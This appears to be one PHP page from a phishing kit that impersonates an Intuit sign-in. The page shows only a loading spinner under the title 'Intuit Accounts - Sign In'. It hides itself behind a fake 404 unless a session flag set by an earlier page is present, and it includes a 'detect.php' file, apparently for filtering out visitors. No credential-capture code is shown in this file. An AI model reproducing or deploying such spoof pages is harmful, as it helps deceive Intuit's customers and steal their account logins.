<?php
session_start();
ob_start();
require_once('../config.php');
include_once('../includes/php/detect.php');

if(!isset($_SESSION['fallow'])) {
   header('HTTP/1.1 404 Not Found');
   exit();
}
?>
<!doctype html>
<html lang="en" data-shell-version="6.364.0-master-bld.1303-61353769-1303">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      <title>Intuit Accounts - Sign In</title>
      
      
      <link rel="preload stylesheet" as="style" href="./css/spin.css" crossorigin="anonymous"/>
      
      
      
   </head>
   <body>
      <div id="web-shell-spinner">
         <div class="idsTSIShortSpinner IndeterminateShort-wrapper">
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            
         </div>
      </div>
      
   </body>
</html>

